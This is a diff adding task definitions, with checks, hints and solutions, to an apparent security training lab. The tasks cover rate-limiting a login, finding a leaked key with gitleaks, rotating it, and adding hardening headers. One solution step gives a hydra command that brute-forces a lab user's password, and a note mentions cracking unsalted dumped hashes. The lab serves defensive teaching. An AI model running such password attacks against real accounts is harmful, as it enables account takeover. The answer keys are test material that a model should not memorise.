+        "note": "Online guessing works when nothing limits attempts (A07:2025 Authentication Failures). If you dumped the hashes in task 5 you could also crack carol's offline: unsalted SHA-256 of a common word is in every list. Defences: rate limits per address and per account, breached-password checks at sign-up (NIST SP 800-63B), MFA, and a slow salted hash (Argon2id, PBKDF2 with ASP.NET Core Identity's PasswordHasher).",
+        "steps": [ { "node": "attacker", "cmd": "hydra -l carol -P ~/top-passwords.txt -s 8080 -f shop http-post-form '/login:username=^USER^&password=^PASS^:F=Wrong username' 2>&1 | grep 'password:'" } ]
+      }
+    },
+    {
+      "id": "t18",
+      "type": "state",
+      "title": "Fix: rate limit the sign-in",
+      "text": "Add ASP.NET Core's built-in **rate limiter** to `POST /login` in `/work/shop/Auth.cs` (on **shop**), then `shop-rebuild`: at most **5 attempts per minute per client IP address**, and the 6th gets **429 Too Many Requests**.\n\nThe check signs in normally from **internal** (another address), then sends 12 wrong passwords quickly from **attacker** and expects a 429 among the answers. (After it, attacker itself has to wait a minute to sign in.)",
+      "checks": [
+        { "node": "internal", "cmd": "bash /lab/checks/check.sh ratelimit-works", "fail_msg": "A normal sign-in as alice (from internal) does not get its 302 redirect any more." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh ratelimit-blocks", "fail_msg": "12 quick wrong passwords from attacker never got a 429." }
+      ],
+      "hints": [
+        "In `AddAuth`: `builder.Services.AddRateLimiter(o => { o.RejectionStatusCode = 429; o.AddPolicy(\"login\", ctx => RateLimitPartition.GetFixedWindowLimiter(ctx.Connection.RemoteIpAddress?.ToString() ?? \"unknown\", _ => new FixedWindowRateLimiterOptions { PermitLimit = 5, Window = TimeSpan.FromMinutes(1) })); });` (`using System.Threading.RateLimiting;`).",
+        "At the start of `MapAuth`: `app.UseRateLimiter();`, and put `.RequireRateLimiting(\"login\")` on the `MapPost(\"/login\", ...)` endpoint."
+      ],
+      "solution": {
+        "note": "A per-address limit stops one machine. Attackers with many addresses (credential stuffing from a botnet) need a per-account limit too, plus breached-password checks and MFA. Behind a proxy or load balancer every request comes from the proxy's address: configure `UseForwardedHeaders` with your known proxies first, or you rate limit everyone together. Run hydra again now: it reports a wrong \"password\", because a 429 page does not contain the failure text. Real tools need tuning against defences, and so do your monitoring rules.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Auth.cs /work/shop/Auth.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t19",
+      "type": "answer",
+      "title": "Find a leaked secret in Git history",
+      "text": "Switch roles: you are the developer again. On **shop**, the source in `/work/shop` is a Git repository. The payments key is read from `/work/secrets/payments.key` now, outside the repository, and `appsettings.json` looks clean. Run a secret scanner over the **whole history**:\n\n```\ncd /work/shop\ngitleaks detect --source . -v\n```\n\nWhat is the leaked key?",
+      "answer_cmd": { "node": "shop", "cmd": "cat /opt/dojo/leaked.key" },
+      "hints": [
+        "`gitleaks detect` scans every commit (the image has gitleaks 8.16; newer versions call it `gitleaks git`). Look at the `Secret:` line.",
+        "Confirm it with Git itself: `git log -p -S pay_live_ --all` shows the commit that added it and the one that removed it."
+      ],
+      "solution": {
+        "note": "Deleting a secret in a new commit does not remove it: every clone keeps the history. Now compare it with `cat /work/secrets/payments.key`. It is the same key: the team moved it but never **rotated** it, so the leaked value still works. That is task 20.",
+        "steps": [ { "node": "shop", "cmd": "cd /work/shop; gitleaks detect --source . --no-banner -r /tmp/leaks.json; jq -r '.[] | .Commit[0:7] + \"  \" + .File + \"  \" + .Secret' /tmp/leaks.json" } ]
+      }
+    },
+    {
+      "id": "t20",
+      "type": "state",
+      "title": "Rotate the leaked key",
+      "text": "Rotate the key, on **shop**:\n\n1. Ask the payments provider for a new key. Its API revokes the old one in the same call:\n   `curl -s -X POST -H \"Authorization: Bearer $(cat /work/secrets/payments.key)\" http://payments.internal:9100/v1/keys/rotate | jq`\n2. Put the new key in `/work/secrets/payments.key` (keep the file where it is: the shop reads it on every call).\n3. Prove the shop still works: `curl -s localhost:8080/api/checkout/health` says `\"payments\": \"ok\"`.\n\nThe check proves the leaked key is dead and the shop talks to payments with the new one.",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh rotate-revoked", "fail_msg": "The leaked key still works at payments.internal. Call /v1/keys/rotate with it." },
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh rotate-works", "fail_msg": "The old key is revoked, but the shop cannot talk to payments: /work/secrets/payments.key does not hold the new key yet (curl localhost:8080/api/checkout/health)." }
+      ],
+      "hints": [
+        "Rotate and save in one go: `curl -s -X POST -H \"Authorization: Bearer $(cat /work/secrets/payments.key)\" http://payments.internal:9100/v1/keys/rotate | jq -r .key > /tmp/new.key`.",
+        "Then `cat /tmp/new.key > /work/secrets/payments.key` (writing into the file keeps its owner and permissions) and `curl -s localhost:8080/api/checkout/health`."
+      ],
+      "solution": {
+        "note": "Rotation is the fix; rewriting history (`git filter-repo --replace-text`) only tidies up afterwards, because forks and clones keep the old commits. Stop the next leak before it happens: run gitleaks as a pre-commit hook and in CI (`gitleaks protect --staged` in 8.16, `gitleaks git --pre-commit` in newer versions), and turn on GitHub secret scanning with push protection.",
+        "steps": [ { "node": "shop", "cmd": "curl -s -X POST -H \"Authorization: Bearer $(cat /work/secrets/payments.key)\" http://payments.internal:9100/v1/keys/rotate | jq -r .key > /tmp/new.key && cat /tmp/new.key > /work/secrets/payments.key && curl -s localhost:8080/api/checkout/health" } ]
+      }
+    },
+    {
+      "id": "t21",
+      "type": "state",
+      "title": "Fix: misconfiguration found by a baseline scan",
+      "text": "On **attacker**, run `baseline-scan`: a small offline stand-in for **OWASP ZAP's baseline scan**, with ZAP's rule ids. It lists what every answer gives away: stack traces (`curl -s http://shop:8080/api/products/999999` shows one, with file paths), the `Server: Kestrel` header, and missing security headers.\n\nFix it in `/work/shop/Hardening.cs` on **shop**, then `shop-rebuild`:\n\n- no developer exception page in production: a generic error answer instead (`AddProblemDetails` + `UseExceptionHandler`);\n- `X-Content-Type-Options: nosniff`, `Referrer-Policy`, and anti-framing (`X-Frame-Options: DENY`, or CSP `frame-ancestors` from task 8);\n- no `Server` header (`KestrelServerOptions.AddServerHeader`).",
+      "checks": [
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh errors-hidden", "fail_msg": "GET /api/products/999999 still answers with exception details or file paths." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh headers-set", "fail_msg": "GET / is missing X-Content-Type-Options: nosniff, a Referrer-Policy, or anti-framing (X-Frame-Options or CSP frame-ancestors)." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh server-hidden", "fail_msg": "Answers still carry a Server header." }
+      ],
+      "hints": [
+        "In `AddHardening`: `builder.Services.AddProblemDetails(); builder.WebHost.ConfigureKestrel(k => k.AddServerHeader = false);`. In `UseHardening`, replace `UseDeveloperExceptionPage()` with `app.UseExceptionHandler();`.",
+        "Headers in a small middleware in `UseHardening`:\n\n```\napp.Use(async (ctx, next) => {\n    ctx.Response.Headers.XContentTypeOptions = \"nosniff\";\n    ctx.Response.Headers.XFrameOptions = \"DENY\";\n    ctx.Response.Headers[\"Referrer-Policy\"] = \"strict-origin-when-cross-origin\";\n    await next();\n});\n```"
+      ],
+      "solution": {
+        "note": "Security misconfiguration is A02:2025, the second most common finding. Run `baseline-scan` again: the warnings left are the ones the lab cannot fix without HTTPS (Secure cookies; HSTS, which browsers ignore over plain HTTP). In a real pipeline, ZAP's baseline scan runs against every staging deploy: `docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://staging.example.com`.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Hardening.cs /work/shop/Hardening.cs && shop-rebuild" } ]
+      }
+    }
+  ]
+}
